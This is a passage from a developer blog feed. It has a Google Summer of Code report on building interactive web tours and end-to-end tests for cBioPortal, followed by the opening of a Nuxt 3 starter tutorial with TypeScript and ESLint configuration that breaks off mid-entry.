    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/08/05/nsi1NZ8aORFEAVK.png" alt="Frame 7 _3_.png"><br>I‚Äôm excited to share my work on the 2023 Google Summer of Code üéâ.<br>In this blog, my will focus on the feature I‚Äôve developed.<br>üîç See more in <a href="https://beking0912.github.io/2023/09/04/Google-Summer-of-Code/"><strong>this post</strong></a> where I‚Äôll share the guide and my experiences.</p><h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><p>About the program:</p><ul><li><strong>Student Name:</strong> <a href="https://github.com/Beking0912">Biqing (Gloria) Su</a></li><li><strong>Mentors:</strong> <a href="https://github.com/JREastonMarks">Jeremy R. Easton-Marks</a>, <a href="https://github.com/fuzhaoyuan">Ryan Fu</a></li><li><strong>Organization:</strong> <a href="https://www.cbioportal.org/">cBioportal for Cancer Genomics</a>, <a href="https://github.com/cBioPortal">github</a></li><li><strong>GSoC Program Announcement:</strong> <a href="https://summerofcode.withgoogle.com/programs/2023/projects/luumPTO5">Proposal Page</a></li><li><strong>GSoC Project Description:</strong> <a href="https://github.com/cBioPortal/GSoC/issues/86">Interactive web tour #86</a></li></ul><p>About my achievements:</p><ul><li><strong>PR:</strong> <a href="https://github.com/cBioPortal/cbioportal-frontend/pull/4687">Add Interactive Web Tour for Virtual Studies and Group Comparison #4687</a></li><li><strong>Related PR:</strong> <a href="https://github.com/cBioPortal/cbioportal-frontend/pull/4700">End-to-End Testing #4700</a>, <a href="https://github.com/cBioPortal/cbioportal/pull/10333">Add show_web_tours #10333</a></li><li><strong>Next Steps:</strong> <a href="https://github.com/cBioPortal/cbioportal/issues/10341">#10341 Track suggestions</a></li><li><strong>Related Documentation:</strong> <a href="https://docs.google.com/document/d/1Xj8ZfcWcv2n_stCM26hMgk63xnxq7s7_W5RUYwBNUoQ/edit#heading=h.f5bc9dunvzs3">documentation</a></li><li><strong>Online Review:</strong> <a href="https://deploy-preview-4707--cbioportalfrontend.netlify.app/">Take a Quick Look Here</a></li></ul><p>Have a try?</p><ul><li><a href="https://deploy-preview-4707--cbioportalfrontend.netlify.app/"><strong>üëâ Click Here to Take a Quick Look! (‚ÄòInteractive Tours‚Äô on the right bar)</strong></a></li></ul><p><img src="https://s2.loli.net/2023/08/24/tYz2BjbpGcsLfMU.gif" alt="tour.gif"></p><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The cBioPortal provides access to a wealth of cancer genomics data, but new users often struggle to navigate its features, and existing users may not be aware of all available tools. This project introduces an <strong>Interactive Web Tour</strong> that aims to enhance the user experience and facilitate the exploration of less prominent features on the site. The interactive web tour guides new users through the functionalities of Virtual Studies as well as Group Comparison.<br>Find more description on <a href="https://github.com/cBioPortal/GSoC/issues/86">Interactive web tour #86</a>.</p><p>The tour is implemented using the <a href="https://github.com/elrumordelaluz/reactour/tree/v1">reactour v1</a> library to provide an interactive UI, leveraging localStorage for seamless page transitions and TypeScript for robust type definitions.<br>The End-to-end testing is implemented using <a href="https://mochajs.org/">Mocha</a> and <a href="https://webdriver.io/">WebdriverIO</a>.</p><h2 id="Achievements"><a href="#Achievements" class="headerlink" title="Achievements"></a>Achievements</h2><ul><li>‚úÖ Implemented an extensible tour component, allowing for easy addition of new tour by creating new step file.</li><li>‚úÖ Created tours for two major features:<ul><li>Virtual Studies<ul><li>Create a Virtual Study for Not Logged In users <strong>DONE</strong></li><li>Create a Virtual Study for Logged In users <strong>DONE</strong></li></ul></li><li>Group Comparison<ul><li>Compare User-defined Groups of Samples <strong>DONE</strong></li></ul></li></ul></li><li>‚úÖ Completed end-to-end tests for the above two tour functionalities.</li></ul><h2 id="File-Structure"><a href="#File-Structure" class="headerlink" title="File Structure"></a>File Structure</h2><ul><li><code>src/tours</code><ul><li><code>Steps</code><ul><li><code>GroupComparison.tsx</code>   &#x2F;&#x2F; Steps for group comparison </li><li><code>VirtualStudy.tsx</code>   &#x2F;&#x2F; Steps for virtual study </li><li><code>index.tsx</code>   &#x2F;&#x2F; Exports all the steps under the folder</li></ul></li><li><code>Tour</code><ul><li><code>index.tsx</code>   &#x2F;&#x2F; Main file, the entry for tours and the tour that actually runs </li><li><code>types.tsx</code>   &#x2F;&#x2F; Types for functions and props</li><li><code>styles.scss</code></li></ul></li><li><code>index.tsx</code>   &#x2F;&#x2F; Exports all tours here</li></ul></li></ul><h2 id="How-it-works"><a href="#How-it-works" class="headerlink" title="How it works"></a>How it works</h2><img src="https://s2.loli.net/2023/08/23/GEf7ryNkjCnK2Lb.png" width="60%"/><h2 id="How-to-add-a-new-tour"><a href="#How-to-add-a-new-tour" class="headerlink" title="How to add a new tour"></a>How to add a new tour</h2><p><img src="https://s2.loli.net/2023/08/23/hj4nGgfsp2mzHEi.png" alt="2022-09-13-2260.png"></p><h2 id="Different-Interactions"><a href="#Different-Interactions" class="headerlink" title="Different Interactions"></a>Different Interactions</h2><ul><li><strong>Normal Step:</strong> Display text with skip all and next step buttons.</li><li><strong>Clickable Step:</strong> Hide the skip all and next step buttons. Automatically jump to the next step once user clicked the target button.</li><li><strong>Selectable Step:</strong> Enable the next step button only after user selected a specific number of samples.</li><li><strong>Tab-hopping:</strong> Display text with skip all and next tab buttons. Automatically load to another tab after user clicked the next tab button.</li><li><strong>Page-hopping:</strong> Hide the skip all and next step buttons. Automatically jump to another page after user clicked the highlighted button.</li></ul><p><img src="https://s2.loli.net/2023/08/23/FOLNPMEycejrQIX.png" alt="2022-09-13-2259.png"></p><h2 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h2><p>E2E tests have been completed for the Create a Virtual Study for Logged In users and Compare User-defined Groups of Samples tour. The tests focus on validating the presence and functionality of expected buttons and elements by simulating user interactions. </p><p>The following features should be covered in E2E testing for Web Tour: </p><ul><li><strong>Tour Navigation</strong>: Verify that users can navigate through each step of the tour correctly, including the ability to move to the next or skill all. </li><li><strong>Element Selector</strong>: Validate that the element selectors in each step accurately identify the relevant elements within the user interface. </li><li><strong>Step Prompt Information</strong>: Ensure that the prompt information in each step is correctly displayed and matches the expected text. </li><li><strong>User Actions</strong>: Verify that user actions in each step successfully trigger the related functionality, such as filling in a search box or selecting studies.</li></ul><p>Below is an example showcasing the aspects validated by the test case:<br><strong>Step 0: Type ‚Äúglioma‚Äù in the search box automatically, on the homepage.</strong></p><ol><li>The tour should be on the first step: <strong>step &#x3D; 0</strong>, initialized at -1. </li><li>There should be <strong>a tour modal</strong>.</li><li>On the modal, the title of the content should be <strong>Search for the studies</strong>.</li><li>On the modal, there should not be a <strong>Skill All</strong> button and a <strong>Next Step</strong> button.</li><li>There should be a search box on the homepage <strong>#cancer-study-search-box input</strong>.</li><li>The value of the search box should be <strong>glioma</strong>.</li><li>Click on the <strong>Next Step</strong> button, the tour should go to the next step.</li></ol><p><img src="https://s2.loli.net/2023/08/23/BNhyl1uwEdkrMab.png" alt="test-2022-09-13-2259.png"></p><p>üëâ <strong>See more about e2e testing on PR <a href="https://github.com/cBioPortal/cbioportal-frontend/pull/4700">#4700</a>.</strong></p><h2 id="Challenge-amp-Solution"><a href="#Challenge-amp-Solution" class="headerlink" title="Challenge &amp; Solution"></a>Challenge &amp; Solution</h2><p>Click to expand and view more.</p><details><summary><div style="font-weight: bold;font-size: 1rem;margin: 0.5rem 0;border: 1px solid;border-radius: 5px;padding: 10px;text-align: center;cursor: pointer;">Challenge 1: Multi-page Transformation</div></summary><p><strong>SITUATION:</strong> Step 2 is on page A but step 3 is on page B, how to connect the steps?<br><strong>SOLUTION:</strong> Use localStorage to store the Tour state, get the state when tour first renders at page B.</p><img src="https://s2.loli.net/2023/08/24/DIU8WLjpinJVQHP.png" width="80%"/></details><details><summary><div style="font-weight: bold;font-size: 1rem;margin: 0.5rem 0;border: 1px solid;border-radius: 5px;padding: 10px;text-align: center;cursor: pointer;">Challenge 2: Automatically Go Next Step</div></summary><p><strong>SITUATION:</strong> After user clicked the target button, how automatically go to the next step?<br><strong>SOLUTION:</strong> Add Event Listener to listen for mouse events, set Timeout to wait for element rendering.</p><img src="https://s2.loli.net/2023/08/24/fFuy49JTE6oLnaC.png" width="80%"/></details><details><summary><div style="font-weight: bold;font-size: 1rem;margin: 0.5rem 0;border: 1px solid;border-radius: 5px;padding: 10px;text-align: center;cursor: pointer;">Challenge 3: Error Running E2E Test Locally</div></summary><p><strong>I‚Äôm trying to run end-to-end tests locally on M1 machine.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yarn version: 1.22.5</span><br><span class="line">node version:  15.2.1</span><br><span class="line">python version: 3.10.12</span><br><span class="line">Apple M1 Pro MacOS Ventura 13.5</span><br></pre></td></tr></table></figure><hr><p><strong>ERROR 1:</strong><br><code>cd end-to-end-test &amp;&amp; yarn</code> can not work correctly,<br>and reported the error: <code>fatal error: &#39;jpeglib.h&#39; file not found</code>.<br><strong>SOLUTION:</strong><br>It was due to a clang path error,<br>add <code>export CPLUS_INCLUDE_PATH=/opt/homebrew/include</code> to <code>~/.zshrc</code>,<br>and then <code>source ~/.zshrc</code>,<br>then it can work.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// .zshrc</span><br><span class="line">export CPLUS_INCLUDE_PATH=/opt/homebrew/include</span><br></pre></td></tr></table></figure><hr><p><strong>ERROR 2:</strong><br><code>yarn run e2e:local --grep=end-to-end-test/local/specs/treatment.spec.js</code> can not work correctly and reported the error:<br><code>No specs found to run, exiting with failure</code>.<br><strong>SOLUTION:</strong><br>Remove <code>/**</code> from <code>wdio.conf.js</code> line 146,<br>and then run <code>yarn run e2e:local --grep=treatment.spec.js</code></p><hr><p><strong>ERROR 3:</strong><br><code>yarn run e2e:local --grep=end-to-end-test/local/specs/treatment.spec.js</code><br>can not work correctly and reported the error:<br><code>Error in onCompleteHook: Error: ENOENT: no such file or directory, scandir &#39;./shared/results/&#39;</code>.<br><strong>SOLUTION:</strong><br>Create a <code>results</code> folder under shared folder.</p></details><details><summary><div style="font-weight: bold;font-size: 1rem;margin: 0.5rem 0;border: 1px solid;border-radius: 5px;padding: 10px;text-align: center;cursor: pointer;">Challenge 4: Simulate Logged-in Users in the Test Code</div></summary><p>We can use <code>goToUrlAndSetLocalStorage</code> function and set the second parameter to false to start the test, then it will automate the login process.<br>See <a href="https://github.com/cBioPortal/cbioportal-frontend/blob/master/end-to-end-test/shared/specUtils.js#L208">specUtils.js#L208</a>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">before</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">goToUrlAndSetLocalStorage</span>(<span class="variable constant_">CBIOPORTAL_URL</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></details><details><summary><div style="font-weight: bold;font-size: 1rem;margin: 0.5rem 0;border: 1px solid;border-radius: 5px;padding: 10px;text-align: center;cursor: pointer;">Challenge 5: Multi-Tab Handling in E2E Testing</div></summary><p><strong>SITUATION:</strong> In group comparison tour, it would open a new ‚Äúgroup comparison page‚Äù tab after clicking the ‚Äúcompare‚Äù button on the mutated genes table. While the new tab is open, but the test code continues to run on the original tab, making it impossible to test the new tab‚Äôs content.<br>At first I thought it was a mistake in my code, then I realized it was because the test code was still in the old tab and not running in the new one.</p><p><strong>SOLUTION:</strong> To address this, I used <a href="https://webdriver.io/docs/api/jsonwp/#getwindowhandles">getWindowHandles</a> to find a list of window handles for every open top-level browsing context, then use the <a href="https://webdriver.io/docs/api/browser/switchWindow/">switchWindow</a> api to switch the WebDriver‚Äôs focus to the new tab. Then it worked correctly on the new tab.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> handles = browser.<span class="title function_">getWindowHandles</span>();</span><br><span class="line"><span class="keyword">const</span> newTabHandle = handles[handles.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">browser.<span class="title function_">switchToWindow</span>(newTabHandle);</span><br></pre></td></tr></table></figure></details><h2 id="Git-History"><a href="#Git-History" class="headerlink" title="Git History"></a>Git History</h2><img src="https://s2.loli.net/2023/09/13/wECMgH9WXGzZvn6.png" width="60%"/><h2 id="Documentation"><a href="#Documentation" class="headerlink" title="Documentation"></a>Documentation</h2><p>For detailed steps of each tour, test procedures, and instructions on adding new tours, refer to the <a href="https://docs.google.com/document/d/1Xj8ZfcWcv2n_stCM26hMgk63xnxq7s7_W5RUYwBNUoQ/edit#heading=h.f5bc9dunvzs3">detailed documentation</a>.</p><h2 id="Demonstration"><a href="#Demonstration" class="headerlink" title="Demonstration"></a>Demonstration</h2><ul><li>Create a Virtual Study for Not Logged In users: <a href="https://drive.google.com/file/d/175nxZWAI6kkPxEmLnhrfHenKUbVj7M90/view?usp=sharing">video</a></li><li>Create a Virtual Study for Logged In users: <a href="https://drive.google.com/file/d/1BX8Ra42a5h9aPvfby-NJuyRvIK6jgRAX/view?usp=drive_link">video</a></li><li>Compare User-defined Groups of Samples: <a href="https://drive.google.com/file/d/1IL1a67X8SiZ_1-VzzPa9QGlO3IHhLGfs/view?usp=drive_link">video</a></li><li>End-to-End Testing for ‚ÄòCreate a Virtual Study‚Äô: <a href="https://drive.google.com/file/d/122c5KwPQHeCJQyq3Nyc_ZtvtcNkf8zR5/view?usp=drive_link">video</a></li><li>End-to-End Testing for ‚ÄòCompare User-defined Groups of Samples‚Äô: <a href="https://drive.google.com/file/d/1JGkzux3p6C9e5OevMTYCXjfwVfX7rfot/view?usp=drive_link">video</a></li></ul><h2 id="Feedback-amp-Next-Steps"><a href="#Feedback-amp-Next-Steps" class="headerlink" title="Feedback &amp; Next Steps"></a>Feedback &amp; Next Steps</h2><p><strong>Midterm Feedback List:</strong> </p><ul><li>‚úÖ Is there any way to link the tour to the questions, if we amplify oftentime we need to answer questions from users and link directly to the tool. </li><li>If anyone breaks elements, is there any way to capture the changes? possible suggestion: scan the code base for data test attributes and keep account of them. (PRIORITY)  ‚úÖ end-to-end testing.</li><li>‚úÖ the done button can be green. add some emoji. (DO IT)</li><li>‚úÖ handle for the pauses in the waiting for element X. (HOLD)</li></ul><p><strong>PR review Feedback List:</strong></p><ul><li>‚úÖ Change text (this table only allows selection by mutation, other tables are for CNA): ‚ÄúClick the check box in the ‚Äú#‚Äù column to select three samples such as IDH1 mutations, TP53 mutant samples and EGFR amplified samples.‚Äù -&gt; Click the check box in the ‚Äú#‚Äù column to select samples with e.g. IDH1 or TP53 mutations.</li><li>‚úÖ In that same step, when select two and then deselect one, error.</li></ul><p><strong>Product Team (Niki) Feedback List:</strong></p><ul><li>‚úÖ On the frontpage could you change: the tour section to be below the ‚ÄúWhat‚Äôs New?‚Äù section? </li><li>‚úÖ Rename the ‚ÄúWeb tours‚Äù header to ‚ÄúInteractive Tours‚Äù.</li></ul><p><strong>Some other thoughts from Ino:</strong></p><ul><li>When you click anywhere else on the page one exists the tour. This is great but sometimes one might accidentally click in the wrong area (happened to me :). Not sure if there‚Äôs an easy way to bring the tour back. Alternatively maybe an additional confirmation button could work (‚ÄúDo you really want to exit the tour?‚Äù) []</li><li>Is there a way to enforce selection of a specific cohort? It might make sense to highlight some more specific cancer biology in future tours. Like e.g. in the mutations table one can explain what the most commonly mutated gene in glioma is. For the genomic alterations one could use e.g. this example and explain why AR is enriched in metastatic samples </li><li>It might also be good to have a separate <a href="https://deploy-preview-3101--cbioportalfrontend.netlify.app/">‚Äúintro to the website‚Äù</a> tour like here: (goes over the main navigation at the top etc)</li></ul><p><a href="https://github.com/cBioPortal/cbioportal/issues/10341">#10341 Track suggestions</a></p><h2 id="Thanks-All"><a href="#Thanks-All" class="headerlink" title="Thanks All!!!"></a>Thanks All!!!</h2><p>Excellent mentoring, <a href="https://github.com/JREastonMarks">Jeremy</a> and <a href="https://github.com/fuzhaoyuan">Ryan</a>! üëèüëèüëè<br>Your guidance was invaluable throughout the GSoC journey. Your timely feedback and insightful suggestions greatly enhanced my learning and project outcomes. Thanks both for your outstanding support! üëèüëèüëè</p><p>Extend my gratitude to the product team, for their thorough product reviews. üëèüëèüëè<br>Special thanks to <a href="https://github.com/inodb">Ino</a> and <a href="https://github.com/alisman">Aaron</a> for their valuable code reviews. üëèüëèüëè<br>I appreciate <a href="https://github.com/inodb">Ino</a> and <a href="https://github.com/dippindots">Gaofei</a> for patiently addressing my numerous questions. üëèüëèüëè<br>And heartfelt thanks to many others who contributed to my success! üëèüëèüëè<br><br/></p><img src="https://s2.loli.net/2023/08/24/c1SPezKaHGN2IkC.jpg" width="80%"/><hr><p>üìÆ Feel free to hit me up about Google Summer of Code experience: <a href="https://www.linkedin.com/in/beking-0912/">Linkedin</a>.<br>üòÑ Let‚Äôs contribute to Open Source!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/08/05/nsi1NZ8aORFEAVK.png&quot; alt=&quot;Frame 7 _3_.png&quot;&gt;&lt;br&gt;I‚Äôm excited to share my work on the 2023 Google S</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    <category term="Open Source" scheme="https://beking0912.github.io/categories/Coding/Open-Source/"/>
    
    
    <category term="React" scheme="https://beking0912.github.io/tags/React/"/>
    
    <category term="TypeScript" scheme="https://beking0912.github.io/tags/TypeScript/"/>
    
  </entry>
  
  <entry>
    <title>üß∞ Minimal Nuxt 3 starter with Vuetify, Pinia and Google login</title>
    <link href="https://beking0912.github.io/2023/07/28/Minimal-Nuxt-3-starter-with-Vuetify-Pinia-and-Google-login/"/>
    <id>https://beking0912.github.io/2023/07/28/Minimal-Nuxt-3-starter-with-Vuetify-Pinia-and-Google-login/</id>
    <published>2023-07-28T18:11:24.000Z</published>
    <updated>2023-08-01T03:10:11.214Z</updated>
    
    <content type="html"><![CDATA[<p>I believe you have already read my üëâ <a href="https://beking0912.github.io/2023/07/09/Migration-Guide-Vue2-Nuxt2-Vuetify2-to-Vue3-Nuxt3-Vuetify3/"><strong>Nuxt 3 migration guide</strong></a> üëà.<br>And in this blog, I‚Äôll be covering exactly what was mentioned there<br>‚Äî <strong>an example demo project that includes Vue 3, Nuxt 3, Vuetify 3, Pinia, PWA, and Firebase authentication</strong>.<br>Find the source code <a href="https://github.com/Beking0912/vue3-nuxt3-vuetify3-starter"><strong>here</strong></a>, making it an excellent starter for those new to Nuxt 3.</p><p>The motivation behind creating this starter was rooted in the complexity of the project I was migrating. It became challenging to pinpoint certain errors, making the debugging process cumbersome. Thus, having a minimal demo project like this proved to be invaluable, as it allows for swift code validation and configuration testing. With this straightforward starter, you can focus on honing your skills and building your Nuxt 3 applications with confidence. </p><p>üöõ Sure, let me walk you through how I built up this starter:</p><ol><li><strong>Initializing a Nuxt 3 Project</strong></li><li><strong>Adding TypeScript Configuration</strong></li><li><strong>Adding ESLint and lint-staged</strong></li><li><strong>Adding Internationalization (i18n)</strong></li><li><strong>Adding Vuetify</strong></li><li><strong>Utilizing SCSS Variables</strong></li><li><strong>Adding Pinia</strong></li><li><strong>Adding Firebase Google Login</strong></li></ol><h2 id="Step-1-Initializing-a-Nuxt-3-Project"><a href="#Step-1-Initializing-a-Nuxt-3-Project" class="headerlink" title="Step 1: Initializing a Nuxt 3 Project"></a>Step 1: Initializing a Nuxt 3 Project</h2><p>To kickstart our journey with Nuxt 3, the first step is to create a new project. Keep in mind that Nuxt 3 requires Node.js version 16.10.0 or newer, so ensure you have the appropriate version installed on your machine.</p><p>To create the project, open your terminal and run the following command, replace <code>&lt;project-name&gt;</code> with the desired name for your project. This command will initialize a new Nuxt 3 project in the specified folder:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx <span class="built_in">create</span>-nuxt-app &lt;project-name&gt;</span><br></pre></td></tr></table></figure><p>Next, navigate to the project folder and then run:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &lt;project-name&gt;</span><br><span class="line">code .</span><br></pre></td></tr></table></figure><p>It‚Äôs time to install the necessary dependencies. With everything set up, the next command allowed to run the Nuxt 3 project locally and start developing:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn install</span><br><span class="line">yarn dev</span><br></pre></td></tr></table></figure><h2 id="Step-2-Adding-TypeScript-Configuration"><a href="#Step-2-Adding-TypeScript-Configuration" class="headerlink" title="Step 2: Adding TypeScript Configuration"></a>Step 2: Adding TypeScript Configuration</h2><p>To further enhance our Nuxt 3 project and leverage the benefits of TypeScript, let‚Äôs integrate TypeScript configuration. TypeScript brings static type checking, improved code readability, and better developer tooling, making it a valuable addition to the project.<br>First, install TypeScript using Yarn:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add --dev typescript</span><br></pre></td></tr></table></figure><p>Next, create a <code>tsconfig.json</code> file in the root of the project. This file serves as the configuration file for TypeScript, enabling us to customize its behavior according to the project‚Äôs needs. Here‚Äôs an example:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tsconfig.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ES2018&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lib&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;ESNext.AsyncIterable&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;DOM&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;esModuleInterop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;skipLibCheck&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sourceMap&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;noEmit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;experimentalDecorators&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;~/*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;./*&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;@types/node&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;vueCompilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;extensions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;.vue&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;node_modules&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;.nuxt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;.firebase&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;extends&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./.nuxt/tsconfig.json&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Step-3-Adding-ESLint-and-lint-staged"><a href="#Step-3-Adding-ESLint-and-lint-staged" class="headerlink" title="Step 3: Adding ESLint and lint-staged"></a>Step 3: Adding ESLint and lint-staged</h2><p>To maintain a consistent and error-free codebase, I implemented ESLint and lint-staged in our Nuxt 3 project. ESLint provides static code analysis to identify and fix code errors, while lint-staged allows us to run ESLint on staged files, ensuring that only the committed code meets our coding standards.<br>To begin, install ESLint and its associated dependencies using Yarn:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yarn add --dev eslint eslint-plugin-nuxt lint-staged</span><br><span class="line">yarn add --dev @nuxtjs/eslint-config-typescript</span><br></pre></td></tr></table></figure><p>Next, create an <code>.eslintrc.js</code> file in the root of the project. This file contains the ESLint configuration, including any rules and plugins we want to enforce. I customized the configuration to suit our project‚Äôs needs, considering both Vue.js and TypeScript specifics.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .eslintrc</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;root&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;browser&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;extends&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;@nuxtjs/eslint-config-typescript&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;plugin:nuxt/recommended&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;eslint:recommended&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ignorePatterns&quot;</span><span 